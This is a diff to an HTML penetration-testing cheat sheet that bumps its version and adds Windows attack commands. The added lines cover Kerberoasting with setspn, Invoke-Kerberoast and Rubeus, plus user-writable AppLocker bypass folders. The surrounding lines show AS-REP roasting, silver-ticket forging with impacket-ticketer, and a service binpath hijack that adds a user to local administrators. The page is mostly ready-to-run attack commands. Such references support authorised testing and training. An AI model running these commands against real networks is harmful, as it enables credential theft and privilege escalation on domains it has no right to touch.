@@ -100,7 +100,7 @@ code{font-family:var(--mono);font-size:12.5px;color:#d7e3f4;background:var(--ele
   <a href="arsenal.html">arsenal</a>
   <a href="cheatsheet.html" aria-current="page">cheat sheet</a>
   <span class="sep"></span>
-  <span class="ver">v1.5.1</span>
+  <span class="ver">v1.5.2</span>
   <button type="button" id="printBtn">print</button>
 </nav>
 
@@ -281,6 +281,8 @@ impacket-lookupsid &lt;domain&gt;/guest@$IP 10000   # same idea, via SID walking
 kerbrute userenum -d &lt;domain&gt; --dc $IP users.txt
 impacket-GetNPUsers &lt;domain&gt;/ -no-pass -usersfile users.txt -dc-ip $IP        # AS-REP roast
 impacket-GetUserSPNs &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt; -dc-ip $IP -request               # Kerberoast
+setspn.exe -Q */*                              # native SPN list, from the box, no creds to type
+#   then: Invoke-Kerberoast -OutputFormat hashcat | fl   or   Rubeus.exe kerberoast /format:hashcat
 # svc account hash -&gt; Administrator on THAT service, no krbtgt/DCSync needed (silver ticket):
 impacket-ticketer -nthash &lt;svc-nt-hash&gt; -domain-sid S-1-5-21-... -domain &lt;dom&gt; -spn MSSQLSvc/sql.&lt;dom&gt;:1433 -user-id 500 Administrator
 export KRB5CCNAME=Administrator.ccache      # then any impacket tool with -k -no-pass
@@ -369,6 +371,8 @@ whoami /priv                                  # look for SeImpersonate -&gt; pot
 systeminfo                                    # then windows-exploit-suggester
 # PoC is C source and the target has no compiler? cross-compile on Kali:
 x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -static   # i686-w64-mingw32-gcc for 32-bit
+# AppLocker default rules allow all of C:\Windows - these live inside it and are user-writable:
+#   C:\Windows\System32\spool\drivers\color | C:\Windows\Tasks | C:\Windows\Temp   (Get-AppLockerPolicy -Effective -Xml)
 accesschk.exe -uwcqv &lt;user&gt; *                 # services you may reconfigure
 sc config &lt;svc&gt; binpath= &quot;cmd /c net localgroup administrators &lt;user&gt; /add&quot; &amp;&amp; sc start &lt;svc&gt;
 #   Server Operators group members can do the above to any service = SYSTEM, no file dropped
